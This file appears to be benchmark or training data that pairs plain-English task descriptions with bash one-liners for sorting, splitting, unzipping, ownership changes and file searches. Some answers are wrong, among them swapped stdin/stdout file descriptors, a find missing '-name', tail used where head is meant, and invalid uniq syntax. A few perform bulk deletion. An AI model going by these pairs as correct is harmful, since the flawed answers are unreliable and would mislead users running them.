{"input": "Show what content owned by root has been modified within the last day", "answer": "find /etc/ -user root -mtime 1"}
{"input": "Shows MAC address of network interface eth0", "answer": "ifconfig eth0 | grep HWaddr |cut -dH -f2|cut -d\\  -f2"}
{"input": "Shows only process trees rooted at processes of this user", "answer": "pstree user"}
{"input": "Shows size of compressed file in .bz2 archive", "answer": "bunzip2 -c bigFile.bz2 | wc -c"}
{"input": "Shows state of 'extglob' shell option", "answer": "shopt -o extglob"}
{"input": "Shows status of a shell option 'compat31'", "answer": "shopt compat31"}
{"input": "Shows strings that NOT match regex '^($|\\s*#|\\s*[[:alnum:]_]+=)'", "answer": "echo \"${line}\" | egrep --invert-match '^($|\\s*#|\\s*[[:alnum:]_]+=)'"}
{"input": "Shuffles strings of text received by 'awk' command on the input", "answer": "awk 'BEGIN{srand();} {printf \"%06d %s\\n\", rand()*1000000, $0;}' | sort -n | cut -c8-"}
{"input": "Silently and recursively change the ownership of all files in the current directory to \"www-data\"", "answer": "sudo chown -Rf www-data *"}
{"input": "Silently read $char number of symbols from file descriptor 4, without backslash escaping, and store received input in 'line' variable", "answer": "read -u 4 -N $char -r -s line"}
{"input": "Silently read a line from standard input into variable \"REPLY\" without backslash escapes and using the prompt $'Press enter to continue...\\n'", "answer": "read -rsp $'Press enter to continue...\\n'"}
{"input": "Silently read a single character from standard input into variable \"REPLY\" without backslash escapes, with a timeout of 5 seconds, and using the prompt $'Press any key or wait 5 seconds to continue...\\n'", "answer": "read -rsp $'Press any key or wait 5 seconds to continue...\\n' -n 1 -t 5"}
{"input": "Silently read a single character from standard input into variable \"key\" without backslash escapes and using the prompt $'Press any key to continue...\\n'", "answer": "read -rsp $'Press any key to continue...\\n' -n 1 key"}
{"input": "Silently read a single character into variable \"REPLY\"", "answer": "read -n1 -s"}
{"input": "Silently read exactly 1 character ignoring any delimiters  into variable \"SELECT\"", "answer": "read -s -N 1 SELECT"}
{"input": "Silently read standard input until the escape key is pressed ignoring backslash escapes and using the prompt $'Press escape to continue...\\n'", "answer": "read -rsp $'Press escape to continue...\\n' -d $'\\e'"}
{"input": "Sort \",\" delimited lines in \"file\" by the first field preserving only unique lines", "answer": "sort -u -t, -k1,1 file"}
{"input": "Sort \"some_data\" by the first and second \";\" delimited entries and stabilizing the sort", "answer": "sort -k1,1 -k2,2 -t';' --stable some_data"}
{"input": "Sort \"some_data\" by the first and second \";\" delimited entries, outputing unique lines and stabilizing the sort", "answer": "sort -k1,1 -k2,2 -t';' --stable --unique some_data"}
{"input": "Sort a file 'file' preserving only unique lines and change the file in-place", "answer": "sort -u -o file !#$"}
{"input": "Sort all directories under current directory placing the file with least modification time at first", "answer": "find -type d -printf '%T+ %p\\n' | sort"}
{"input": "Sort all directory names matching folder_* and go to the last one", "answer": "cd $(find . -maxdepth 1 -type d -name \"folder_*\" | sort -t_ -k2 -n -r | head -1)"}
{"input": "Sort all files/directories under current directory according to modification time and print only the recent 7 of them", "answer": "find -mindepth 1 -printf \"%T@ %P\\n\" | sort -n -r | cut -d' ' -f 2- | tail -n +7"}
{"input": "Sort and display the file name and creation month of top 11 files in the entire file system (Sort in the order of month )", "answer": "find / -type f -printf \"\\n%Ab %p\" | head -n 11 | sort -k1M"}
{"input": "Sort and print each unique line in \"myfile.txt\"", "answer": "cat myfile.txt| sort| uniq"}
{"input": "Sort content of files 'file1' and 'file2' by second of dot-separated fields", "answer": "cat file1 file2 |sort -t. -k 2.1"}
{"input": "Sort file \"a.csv\" by the first comma separated value of each line and print only unique entries", "answer": "tac a.csv | sort -u -t, -r -k1,1 |tac"}
{"input": "Sort file pointed by variable $filename, removing duplicate entries but ignoring the last N characters of each line", "answer": "rev $filename | sort | uniq -f=N | rev"}
{"input": "Sort file.txt ignoring the last 10 characters of each line", "answer": "sort file.txt | rev | uniq -f 10 | rev"}
{"input": "Sort lines in \"FILE\" to standard output preserving only unique lines", "answer": "sort -u FILE"}
{"input": "Sort lines in \"set1\" and \"set2\" to standard output preserving only unique lines", "answer": "sort -u set1 set2"}
{"input": "Sort strings of 'test.txt' file by second from the end field", "answer": "rev   test.txt | sort  -k2 | rev"}
{"input": "Sort tab separated file \"file\" using a version sort for field 6 and a numeric sort for field 7", "answer": "sort -t$'\\t' -k6V -k7n file"}
{"input": "Sort the lines of the file 'inputfile', keep only the uniq lines and change it in-place", "answer": "sort inputfile | uniq | sort -o inputfile"}
{"input": "Sorts content of the $tmp file and filters out all strings with ':0'", "answer": "sort $tmp | grep -v ':0'  #... handle as required"}
{"input": "Source \"lib/B\" relative to the directory of the executing shell script, will fail if currently running script is not in PATH", "answer": "source \"$( dirname \"$( which \"$0\" )\" )/lib/B\""}
{"input": "Source executable \"virtualenvwrapper.sh\" found in $PATH", "answer": "source `which virtualenvwrapper.sh`"}
{"input": "Sources script incl.sh in the folder where current running script is located", "answer": "source \"$( dirname \"${BASH_SOURCE[0]}\" )/incl.sh\""}
{"input": "Split \"$1\" into files of at most \"$2\" or default 10000 using a numeric suffix of length 6", "answer": "split -l ${2:-10000} -d -a 6 \"$1\""}
{"input": "Split \"$INFILE\" into files of at most \"$SPLITLIMT\" with a numeric suffix and a prefix \"x_\"", "answer": "split -d -l $SPLITLIMT $INFILE x_"}
{"input": "Split \"$file\" into files with at most 1000 lines each and use a prefix length of 5", "answer": "split -a 5 $file"}
{"input": "Split \"$in_file\" excluding the first line into files of at most 100000 lines each with numeric suffixes of length 5 and the prefix $in_file\"_\"", "answer": "awk '{if (NR!=1) {print}}' $in_file | split -d -a 5 -l 100000 - $in_file\"_\""}
{"input": "Split \"${fspec}\" into 6 files with about equal number of lines each and use prefix \"xyzzy.\"", "answer": "split --number=l/6 ${fspec} xyzzy."}
{"input": "Split \"/etc/gconf/schemas/gnome-terminal.schemas\" into 1000000 files of about equal size", "answer": "split -n 1000000 /etc/gconf/schemas/gnome-terminal.schemas"}
{"input": "Split \"/tmp/files\" into files of at most 1000 lines each", "answer": "split /tmp/files"}
{"input": "Split \"/usr/bin/firefox\" into 1000 files of about equal size", "answer": "split -n 1000 /usr/bin/firefox"}
{"input": "Split \"/usr/bin/gcc\" into 100000 files of about equal size", "answer": "split -n 100000 /usr/bin/gcc"}
{"input": "Split \"ADDRESSS_FILE\" into files containing at most 20 lines and prefix \"temp_file_\"", "answer": "split -l20 ADDRESSS_FILE temp_file_"}
{"input": "Split \"bigfile\" into files of at most 1000 lines each with prefix \"/lots/of/little/files/here\"", "answer": "split bigfile /lots/of/little/files/here"}
{"input": "Split \"complete.out\" into files with at most \"$lines_per_file\" lines each", "answer": "split --lines $lines_per_file complete.out"}
{"input": "Split \"data.tsv\" into files of at most 100 MiB preserving lines and use a prefix of \"data.tsv.\" and numeric suffixes", "answer": "split -C 100m -d data.tsv data.tsv."}
{"input": "Split \"file\" into 10 files of about equal size without splitting lines", "answer": "split -n l/10 file"}
{"input": "Split \"file.tar.gz\" into files of size 1024 MB", "answer": "split -b 1024m file.tar.gz"}
{"input": "Split \"file.txt\" into files of at most 1 MiB in size with a numeric suffix and prefix \"file\"", "answer": "split -b 1M -d  file.txt file"}
{"input": "Split \"hugefile.txt\" into files with 100000 lines each starting with \"part.\" and using numeric suffixes", "answer": "split -a4 -d -l100000 hugefile.txt part."}
{"input": "Split \"infile\" into 2 files of about equal size", "answer": "split -n2 infile"}
{"input": "Split \"input.txt\" into files with 1 line each and use a prefix \"output.\" and a suffix length of 5", "answer": "split --lines=1 --suffix-length=5 input.txt output."}
{"input": "Split \"system.log\" into files of at most 10 MiB in size with a numeric suffix and prefix \"system_split.log\"", "answer": "split -b 10M -d  system.log system_split.log"}
{"input": "Split \"t.txt\" into files with at most 30000000 lines each and use a prefix \"t\" and numeric suffixes of length 2", "answer": "split --lines=30000000 --numeric-suffixes --suffix-length=2 t.txt t"}
{"input": "Split \"your_file\" into files with at most 9 lines each", "answer": "split -l9 your_file"}
{"input": "Split a file \"file.tar.gz\" into pieces named as \"file.tar.gz.part-NNN\" with size 1024 MB where NNN is a numeric suffix", "answer": "split -b 1024m \"file.tar.gz\" \"file.tar.gz.part-\""}
{"input": "Split a file \"file.tar.gz\" into pieces with size 1024 MB", "answer": "split -b 1024m file.tar.gz"}
{"input": "Split a file ADDRESSS_FILE into pieces per 20 lines named with prefix \"temp_file_ and numeric suffixes", "answer": "split -l20 ADDRESSS_FILE temp_file_"}
{"input": "Split all files in the directory tree \"/dev/shm/split/\" into files of at most 1000 lines each and use the filename as the prefix", "answer": "find /dev/shm/split/ -type f -exec split -l 1000 {} {} \\;"}
{"input": "Split standard input into files with at most 75 lines each", "answer": "split --lines=75"}
{"input": "Split the contents of \"file1 file2 ... file40000\" into 1445 files in a round robin fashion with prefix \"outputprefix\" and numeric suffixes", "answer": "cat file1 file2 ... file40000 | split -n r/1445 -d - outputprefix"}
{"input": "Split the contents of all \".txt\" excluding the first 1000 lines into files of at most 1000 lines each", "answer": "cat *.txt | tail -n +1001 | split --lines=1000"}
{"input": "Split the first 100 lines of \"datafile\" into files with at most 1700 bytes each preserving lines", "answer": "sed 100q datafile | split -C 1700 -"}
{"input": "Split the sorted and unique lines in files \"emails_*.txt\" into files with at most 200 lines each with numeric suffixes of length 4", "answer": "sort --unique emails_*.txt | split --numeric-suffixes --lines=200 --suffix-length=4 --verbose"}
{"input": "Starts new tmux session, assuming the terminal supports 256 colours", "answer": "tmux -2"}
{"input": "Store N symbols of input into variable 'buffer'", "answer": "read -N $BUFSIZE buffer"}
{"input": "Store content of uncompressed file \"$file.fastq\" in variable \"reads\"", "answer": "reads=$(zcat $file.fastq)"}
{"input": "Store info about all mounted file systems, printing all sizes in powers of 1000", "answer": "a=$( df -H )"}
{"input": "Stores date of last month day in the 'lastdaymonth' variable", "answer": "set lastdaymonth=`cal $month $year  |tr -s \" \" \"\\n\"|tail -1`"}
{"input": "Strip all '\\' and newlines from $output and save the result to variable 'output'", "answer": "output=$(echo \"$output\" | tr -d '\\' | tr -d '\\n')"}
{"input": "Strips last section from the path $pathname, and prints basename of the rest part", "answer": "echo $(basename $(dirname $pathname))"}
{"input": "Strips two last sections from the path $pathname, and prints basename of the rest part", "answer": "echo $(basename $(dirname $(dirname $pathname)))"}
{"input": "Subtract all columns in \"File2\" from \"File1\" except the first", "answer": "awk 'FNR==NR { for(i=2;i<=NF;i++) a[$1][i]=$i; next } { for(j=2;j<=NF;j++) $j-=a[$1][j] }1' File2 File1 | rev | column -t | rev"}
{"input": "Subtract each column in File2 from matching column in File1, output the result in a similarly formatted table", "answer": "awk 'FNR==NR { for(i=2;i<=NF;i++) a[$1][i]=$i; next } { for(j=2;j<=NF;j++) $j-=a[$1][j] }1' File2 File1 | rev | column -t | rev"}
{"input": "Suffix all files and folders in the current directory with \"_SUF\"", "answer": "ls | xargs -I {} mv {} {}_SUF"}
{"input": "Synchronize \"/home/user1/\" to \"wobgalaxy02:/home/user1/\" including hidden files", "answer": "rsync -av /home/user1/ wobgalaxy02:/home/user1/"}
{"input": "Synchronize \"/path/to/dir_a\" with files in \"/path/to/dir_b/\" if the files are newer", "answer": "rsync -rtuv /path/to/dir_b/* /path/to/dir_a"}
{"input": "Synchronize \"/path/to/dir_b\" with files in \"/path/to/dir_a/\" if the files are newer", "answer": "rsync -rtuv /path/to/dir_a/* /path/to/dir_b"}
{"input": "Synchronize \"xxx-files\" to \"different-stuff/xxx-files\" recursively preserving metadata with a bandwidth limit of 2000 KiB/s", "answer": "rsync -pogtEtvr --progress --bwlimit=2000 xxx-files different-stuff"}
{"input": "Take a file path from standard input and remove it", "answer": "xargs -I '{}' rm '{}'"}
{"input": "Take first text field from file 'file.txt' as a domain name and get short A record for this one", "answer": "cut -d' ' -f1 file.txt | xargs dig +short"}
{"input": "Take the last slash-separated section of variable \"FILE\" and copy it to variable \"NAME\"", "answer": "NAME=`basename \"$FILE\"`"}
{"input": "Take the section of variable \"FILE\" between the last slash and the following dot, if any, and store that section in variable \"NAME\"", "answer": "NAME=`basename \"$FILE\" | cut -d'.' -f-1`"}
{"input": "Takes first text field from file 'file.txt' as a domain name and gets short A record for this one", "answer": "awk '{print $1}' file.txt | xargs dig +short"}
{"input": "Takes folder name of file $0, changes backslashes to forward ones and saves result in $basedir variable", "answer": "basedir=$(dirname \"$(echo \"$0\" | sed -e 's,\\\\,/,g')\")"}
{"input": "Takes path list from '.exportfiles.text' file, cuts off first two path segments and last one", "answer": "cut -d / -f 4- .exportfiles.text | xargs -n 1 dirname"}
{"input": "Test if \"file.tar.gz\" is corrupt", "answer": "gunzip -t file.tar.gz"}
{"input": "Test if a file named 'file' in the current directory is more than 1 hour old", "answer": "find file -chour +1 -exit 0 -o -exit 1"}
{"input": "The cpio command is a copy command designed to copy files into and out of a cpio or tar archive, automatically preserving permissions, times, and ownership of files and subdirectories", "answer": "find . | cpio -pdumv /path/to/destination/dirrectory"}
{"input": "The file \"files_to_find.txt\" contains a list of filenames, create each file or update its timestamp if it exists", "answer": "touch `cat files_to_find.txt`"}
{"input": "This command find displays the files which are modified in the last 15 minutes. And it lists only the unhidden files. i.e hidden files that starts with a . (period) are not displayed in the find output", "answer": "find . -mmin -15 \\( ! -regex \".*/\\..*\" \\)"}
{"input": "This find command ignore the case when searching for file name , to ignore the case  in this example all .py & .PY file will search", "answer": "find . -type f -iname \"*.py\""}
{"input": "This will remove all files (type f) modified longer than 14 days ago under /root/Maildir/ recursively from there and deeper (mindepth 1", "answer": "find /root/Maildir/ -mindepth 1 -type f -mtime +14 | xargs rm"}
{"input": "Time stamp every ping request to 8.8.8.8 in Unix epoch format", "answer": "ping -D -n -O -i1 -W1 8.8.8.8"}
{"input": "Tmux configuration to enable mouse support within tmux", "answer": "set -g mouse on"}
{"input": "To descend at most one levels of directories below the command line arguments pass the -maxdepth 1 option. This will avoid deleting nested directories:", "answer": "find .  -maxdepth 1 -type d -iname \".[^.]*\" -print0 | xargs -I {} -0 rm -rvf \"{}\""}
{"input": "To match only hidden dot directories", "answer": "find /nas01/backups/home/user/ -type d -name \".*\" -print0 -exec ls -lrt {} \\;"}
{"input": "Traverse the filesystem just once, listing setuid files and directories into /root/suid.txt and large files into /root/big.txt", "answer": "find /       \\( -perm -4000 -fprintf /root/suid.txt '%#m %u %p\\n' \\) , \\              \\( -size +100M -fprintf /root/big.txt  '%-10s %p\\n' \\)"}
{"input": "Trim leading and trailing whitespace from variable 'var'", "answer": "var=`echo $var | awk '{gsub(/^ +| +$/,\"\")}1'`"}
{"input": "Truncate all non-empty regular files under the current directory", "answer": "find . -type f -maxdepth 1 -not -empty -print0 | xargs -0i cp /dev/null {}"}
{"input": "Turns on network interface eth0", "answer": "ifconfig eth0 up"}
{"input": "Type unique list of all directories contiaining each file named 'myfile' under the /home directory", "answer": "find /home/ -name 'myfile' -type f | rev | cut -d \"/\" -f2- | rev | sort -u"}
{"input": "Uncomment every entry in current user's cron job list which contains \"test.sh\"", "answer": "crontab -l | sed '/# *\\([^ ][^ ]*  *\\)\\{5\\}[^ ]*test\\.sh/s/^# *//' | crontab -"}
{"input": "Ungzip and untar all files matching \"www-backup.tar.*\"", "answer": "cat www-backup.tar.*|gunzip -c |tar xvf -"}
{"input": "Unset the executable bit of all regular files from directory trees arch, etc, lib, module, usr, xpic", "answer": "find arch etc lib module usr xpic -type f | xargs chmod -x"}
{"input": "Unzip \"bigfile.txt.gz\" to standard output, search for patterns in \"patterns.txt\", and list the unique matches", "answer": "gunzip -c bigfile.txt.gz | grep -f patterns.txt | sort | uniq -c"}
{"input": "Unzip \"daily_backup.sql.gz\" and search for lines matching \"'x'|/x/\"", "answer": "zcat daily_backup.sql.gz| grep -E \"'x'|/x/\""}
{"input": "Unzip \"file.gz\" and print each line with the 5th \" or | separated field greater than 5", "answer": "zcat file.gz | awk -F'[|\"]' '$5>5'"}
{"input": "Unzip \"file.gz\" to standard output and execute in bash with arguments \"-n wordpress\"", "answer": "gzip -d --stdout file.gz | bash -s -- \"-n wordpress localhost\""}
{"input": "Unzip \"file.gz\", list the unique first comma separated field prefixed by the number of occurrences, sort from least frequent to most frequent", "answer": "zcat file.gz | cut -f1 -d, | sort | uniq -c | sort -n"}
{"input": "Unzip \"file.gz\", list the unique lines matching regex pattern '\"searchstring\":\"[^\"]*\"' prefixed by the number of occurrences, sort from least frequent to most frequent", "answer": "zcat file.gz | grep -o '\"searchstring\":\"[^\"]*\"'| sort | uniq -c | sort -n"}
{"input": "Unzip \"path/to/test/file.gz\" to standard output and save all lines matching \"my regex\" to files with a 1000000 limit", "answer": "gzip -cd path/to/test/file.gz | awk 'BEGIN{global=1}/my regex/{count+=1;print $0 >\"part\"global\".txt\";if (count==1000000){count=0;global+=1}}'"}
{"input": "Unzip all \".gz\" files in the current directory tree excluding files containing \"dvportgroups\", \"nsanity\", \"vcsupport\", \"viclient\", and \"vsantraces\"", "answer": "find . -name '*.gz' ! -name '*dvportgroups*' ! -name '*nsanity*' ! -name '*vcsupport*' ! -name '*viclient*' ! -name 'vsantraces*' -exec gunzip -vf {} \\;"}
{"input": "Unzip all \".gz\" files in the current directory tree to their respective directories", "answer": "find . -name \"*.gz\" -execdir gunzip '{}' \\;"}
{"input": "Unzip all files matching \"/homes/ndeklein/mzml/*.gz\"", "answer": "ls /homes/ndeklein/mzml/*.gz | xargs -I {} gunzip {}"}
{"input": "Unzip all files matching \"test1/*/*.gz\"", "answer": "gunzip test1/*/*.gz"}
{"input": "Unzip all files that match \"*.gz\" in the current directory and subdirectories to stdout and search for \"test\"", "answer": "find . -name \"*.gz\" -exec zcat \"{}\" + |grep \"test\""}
{"input": "Unzip and expand tar archive \"compressFileName\"", "answer": "zcat compressFileName | tar xvf -"}
{"input": "Unzip and extract \"*\\(userAgent=[^=]*\\) [^ =][^ =]*=.*\" from \"input.gz\"", "answer": "zcat input.gz | sed -n 's/.*\\(userAgent=[^=]*\\) [^ =][^ =]*=.*/\\1/p'"}
{"input": "Unzip and extract \"*\\(userAgent=[^=]*\\) [^ =]\\+=.*\" from \"input.gz\"", "answer": "zcat input.gz | sed -n 's/.*\\(userAgent=[^=]*\\) [^ =]\\+=.*/\\1/p'"}
{"input": "Unzip and merge all \"small-*.gz\" files into files of 2000000 lines", "answer": "zcat small-*.gz | split -d -l2000000 -a 3 - large_"}
{"input": "Unzip and untar \"4.56_release.tar.gz\" to standard output", "answer": "gunzip -c 4.56_release.tar.gz | tar xvf -"}
{"input": "Unzip and untar \"file.tar.gz\"", "answer": "zcat file.tar.gz |tar x"}
{"input": "Unzip and untar \"myarchive.tar.gz\" and check for corruption", "answer": "gunzip -c myarchive.tar.gz | tar -tvf -"}
{"input": "Unzip and untar \"openssl-fips-2.0.1.tar.gz\"", "answer": "gunzip -c openssl-fips-2.0.1.tar.gz | tar xf \u00ad-"}
{"input": "Unzip and untar \"tarball.tar.gz\"", "answer": "zcat tarball.tar.gz | tar x"}
{"input": "Unzip every \".gz\" file in the current directory tree", "answer": "find . -name \"*.gz\" | xargs gunzip"}
{"input": "Update the archive '2009.tar' with the files from the data/ directory tree that match pattern 'filepattern-*2009*'", "answer": "find data/ -name filepattern-*2009* -exec tar uf 2009.tar {} ;"}
{"input": "Update the archived copy of the home directory, \"alldata.tar\"", "answer": "find ~/ -newer alldata.tar -exec tar uvf alldata.tar {} ;"}
{"input": "Update the timestamp of '/tmp/$$' to the current month and day", "answer": "touch -t `date +%m%d0000` /tmp/$$"}
{"input": "Update timestamps of all files (not directories) under current directory", "answer": "find . -exec touch {} \\;"}
{"input": "Update timestamps of all files (not directories) under current directory. Also works on older Unix systems with obsolete 'find' command", "answer": "find . -print -exec touch {} \\;"}
{"input": "Update timestamps of all files and directories under directory /path/to/dir", "answer": "find /path/to/dir -print0 | xargs -0 touch"}
{"input": "Update timestamps of all files in entire filesystem which are not newer than /tmp/timestamp", "answer": "find / ! -newer /tmp/timestamp -exec touch {} \\;"}
{"input": "Use \"$BYTES\" amount of RAM for \"$SECONDS\" seconds with no output", "answer": "cat <(yes | tr \\\\n x | head -c $BYTES) <(sleep $SECONDS) | grep n"}
{"input": "Use \"$BYTES\" amount of RAM with no output", "answer": "yes | tr \\\\n x | head -c $BYTES | grep n"}
{"input": "Use \"/var/log/wtmp\" and print IPs and search for \"^msw.*127.0.0.1\"", "answer": "who --ips /var/log/wtmp | grep '^msw.*127.0.0.1'"}
{"input": "Use 'less' to nicely display control characters from the outupt of 'grep'", "answer": "grep -b -o $'\\x0c' filename | less"}
{"input": "Use ANSI escape codes to make \"World\" bold from input \"Hello World!\"", "answer": "echo 'Hello World!' | sed $'s/World/\\e[1m&\\e[0m/'"}
{"input": "Use awk command 'FNR==NR { array[$1,$2]=$8; next } ($1,$2) in array { print $0 \";\" array[$1,$2] }' on compressed files \"input1.vcf.gz\" and \"input2.vcf.gz\"", "answer": "gzip -dc input1.vcf.gz input2.vcf.gz | awk 'FNR==NR { array[$1,$2]=$8; next } ($1,$2) in array { print $0 \";\" array[$1,$2] }'"}
{"input": "Use awk command '{ ... }' on compressed files \"input1.vcf.gz\" and \"input2.vcf.gz\"", "answer": "awk '{ ... }' <(gzip -dc input1.vcf.gz) <(gzip -dc input2.vcf.gz)"}
{"input": "Use multiple -exec command in find . Find all .txt files & grep banna in .txt files ", "answer": "find . -name \"*.txt\" -exec echo {} \\; -exec grep banana {} \\;"}
{"input": "Use the first non-zero exit code (if any) of a set of piped commands as the exit code of the full set of commands", "answer": "set -o pipefail"}
{"input": "Use the octal form to find and print detailed information about all regular files in your home directory and below that have only the group permission set", "answer": "find . -perm 040 -type f -exec ls -l {} \\;"}
{"input": "Variable PID contains a process ID, send SIGTERM to this process if it exists", "answer": "kill $PID"}
{"input": "Verbosely compresses all files on fifth and sixth depth level keeping original files in place", "answer": "bzip2 -kv */*/*/*/*/*"}
{"input": "Verbosely compresses all files on fourth and fifth depth level keeping original files in place", "answer": "bzip2 -kv */*/*/*/*"}
{"input": "Verbosely compresses all files on second and third depth level keeping original files in place", "answer": "bzip2 -kv */*"}
{"input": "Verbosely compresses all files on seventh and eighth depth level keeping original files in place", "answer": "bzip2 -kv */*/*/*/*/*/*/*"}
{"input": "Verbosely compresses all files on sixth and seventh depth level keeping original files in place", "answer": "bzip2 -kv */*/*/*/*/*/*"}
{"input": "Verbosely compresses all files on third and fourth depth level keeping original files in place", "answer": "bzip2 -kv */*/*"}
{"input": "View history using \"vim\" in read only mode", "answer": "history | vim -R -"}
{"input": "View line 500 to line 1000 in gzipped file \"bigfile.z\"", "answer": "zcat bigfile.z | sed -ne '500,1000 p'"}
{"input": "View line 500 to line 500 + 501 in gzipped file \"bigfile.z\"", "answer": "zcat bigfile.z | tail -n +500 | head -501"}
{"input": "View lines 116 through 120 of history", "answer": "history | head -n 120 | tail -n 5"}
{"input": "View the bash manpage, starting with the view positioned at the first occurrence of the expression \"BASH_SOURCE\"", "answer": "man bash | less -p BASH_SOURCE"}
{"input": "Views text content of compressed FileB file in TarFile archive", "answer": "tar -xOf TarFile FileB.gz | zless"}
{"input": "Will run checksums recursively from the current directory, and give back grouped filenames of all identical checksum results", "answer": "find ./ -type f -print0 | xargs -0 -n1 md5sum | sort -k 1,32 | uniq -w 32 -d --all-repeated=separate | sed -e 's/^[0-9a-f]*\\ *//;'"}
{"input": "Wrap each line in \"file\" to fit in 80 characters and count the number of lines", "answer": "fold file | wc -l"}
{"input": "Wrap each line in \"file.txt\" to fit in 80 characters", "answer": "cat file.txt | fold"}
{"input": "Wrap each line in \"longline\" to a maximum of 30 characters", "answer": "fold -w30 longline"}
{"input": "Wrap each line in \"longline\" to a maximum of 30 characters breaking at spaces", "answer": "fold -w30 -s longline"}
{"input": "Wrap each line in \"yourfile\" to fit in 79 characters and right pad any lines shorter with spaces", "answer": "fold -w79 yourfile | sed -e :a -e 's/^.\\{0,78\\}$/& /;ta'"}
{"input": "Write \"2-1\" to standard output and to \"/sys/bus/usb/drivers/usb/unbind\"", "answer": "echo '2-1' |sudo tee /sys/bus/usb/drivers/usb/unbind"}
{"input": "Write \"2-1.1.1\" to standard output and to file \"/sys/bus/usb/drivers/usb/unbind\"", "answer": "echo '2-1.1.1'|sudo tee /sys/bus/usb/drivers/usb/unbind"}
{"input": "Write \"\\n/usr/local/boost_1_54_0/stage/lib\" to standard output and append to \"/etc/ld.so.conf\"", "answer": "echo -e \"\\n/usr/local/boost_1_54_0/stage/lib\" | sudo tee -a /etc/ld.so.conf"}
{"input": "Write \"deb blah ... blah\" to standard output and append to \"/etc/apt/sources.list\" as root", "answer": "echo 'deb blah ... blah' | sudo tee --append /etc/apt/sources.list"}
{"input": "Write \"deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen\" to standard output and append to \"/etc/apt/sources.list.d/10gen.list\" as root", "answer": "sudo echo \"deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen\" | sudo tee -a /etc/apt/sources.list.d/10gen.list"}
{"input": "Write \"error\" to standard output", "answer": "echo \"error\" | tee"}
{"input": "Write \"fifo forever\" infinitely using the named pipe \"fifo\" by writing its contents to standard output and to \"fifo\"", "answer": "echo \"fifo forever\" | cat - fifo | tee fifo"}
{"input": "Write \"foo\" to the real path of the current command's standard input", "answer": "echo foo | readlink /proc/self/fd/1"}
{"input": "Write \"foo\" to the real path of the current command's standard output", "answer": "echo foo | readlink /proc/self/fd/0"}
{"input": "Write \"hello world\" to the console and print number of bytes, symbols and strings in provided input", "answer": "echo \"hello world\" | tee >(wc)"}
{"input": "Write '\"myname=\"Test\"' to the console and append to \"$CONFIG\" as root", "answer": "echo \"myname=\\\"Test\\\"\" | sudo tee --append $CONFIG"}
{"input": "Write a random list of numbers to /tmp/lst and stdout", "answer": "seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') **...**"}
{"input": "Write contents of \"/sys/kernel/debug/tracing/trace_pipe\" to standard output and to \"tracelog.txt\" executing as a root user", "answer": "sudo cat /sys/kernel/debug/tracing/trace_pipe | tee tracelog.txt"}
{"input": "Write every two lines in \"infile\" on a single line separated by a comma", "answer": "cat infile | paste -sd ',\\n'"}
{"input": "Write every two lines in \"infile\" on a single line separated by a space", "answer": "cat infile | paste -sd '  \\n'"}
{"input": "Write out the entire directory hierarchy from the current directory", "answer": "find ."}
{"input": "Write output of \"ls -hal /root/\" to standard output and to \"/root/test.out\"", "answer": "ls -hal /root/ | sudo tee /root/test.out"}
{"input": "Write the common third space separated fields in \"file1.sorted\" and \"file2.sorted\" to \"common_values.field\"", "answer": "comm -12 <(cut -d \" \" -f 3 file1.sorted | uniq) <(cut -d \" \" -f 3 file2.sorted | uniq) > common_values.field"}
{"input": "Write the lines appended to \"xxxx\" as it appears to the console and append to \"yyyy\" in the background", "answer": "tail -F xxxx | tee -a yyyy &"}
{"input": "add read permission to others for the files in the current folder having the name \"rc.conf\" in their name", "answer": "find . -name \"*rc.conf\" -exec chmod o+r '{}' \\;"}
{"input": "add read,write permissions to all the files in the current folder which have the permission 600", "answer": "find . -perm 600 -print | xargs chmod 666"}
{"input": "all .jpg or .png images modified in the past week", "answer": "find . -mtime -7 \\( '*.jpg' -o -name '*.png' \\)"}
{"input": "all the files that end with .mp3 and end with .jpg", "answer": "find . -name '*.mp3' -name '*.jpg' -print"}
{"input": "ask user confirmation and delete all the files in the directory /mydir which have not been accessed in the last 100*24 hours", "answer": "find /mydir -atime +100 -ok rm {} \\;"}
{"input": "beginning at the end of the file, prints lines matching /2012/ and exits after first non-matching line", "answer": "tac error.log | awk '{if(/2012/)print;else exit}'"}
{"input": "bind key \"\\x61\" to insert itself", "answer": "bind $'\"\\x61\"':self-insert"}
{"input": "calculate the disk usage for all the files which have been modified in the last 24 hours in ~/tmp folder and display the file sizes", "answer": "find ~/tmp -mtime 0 -exec du -ks {} \\; | cut -f1"}
{"input": "change cgi files to mode 755", "answer": "find htdocs cgi-bin -name \"*.cgi\" -type f -exec chmod 755 {} \\;"}
{"input": "change group of the file /var/lib/php/session  to group lighttpd", "answer": "chown -R :lighttpd /var/lib/php/session"}
{"input": "change html files to mode 644", "answer": "find /usr/local -name \"*.html\" -type f -exec chmod 644 {} \\;"}
{"input": "change owner and group of the file \"/path/to/yourapp\" to root", "answer": "chown -v root:root /path/to/yourapp"}
{"input": "change owner and group of the file it to user and group root", "answer": "chown root:root it"}
{"input": "change owner and group of the file uid_demo to user and group root", "answer": "sudo chown root:root uid_demo"}
{"input": "change owner of all files into current directory except  files named as  './var/foo*' to user www-data", "answer": "find . -not -iwholename './var/foo*' -exec chown www-data '{}' \\;"}
{"input": "change owner of the file file.sh to user root", "answer": "$sudo chown root file.sh"}
{"input": "change owner of the files into directory \"/mydir\" with \".txt\" extension to user root", "answer": "find /mydir -type f -name \"*.txt\" -execdir chown root {} ';'"}
{"input": "change owner of the files into directory dir_to_start except directory dir_to_exclude to user owner", "answer": "find dir_to_start -name dir_to_exclude -prune -o -print0 | xargs -0 chown owner"}
{"input": "change the directory to the last found folder in the directory 'a'", "answer": "cd `find a |sed '$!d'`"}
{"input": "change the extension of all the \".abc\" files in the folder \"/the/path\" to \".edefg\" and do not change in the sub directories", "answer": "find /the/path -depth -name \"*.abc\" -exec rename 's/\\.abc$/.edefg/' {} +"}
{"input": "change the extension of all the \".abc\" files in the folder \"/the/path\" to \".edefg\" and do not change in the sub directories. execdir ensures that the command after it is executed only in the folder where the file is found", "answer": "find /the/path -type f -name '*.abc' -execdir rename 's/\\.\\/(.+)\\.abc$/version1_$1.abc/' {} \\;"}
{"input": "change the extension of all the \".lst\" files in the current folder to \"a.lst\"", "answer": "find -name '*.lst' -exec rename .lst a.lst {} \\;"}
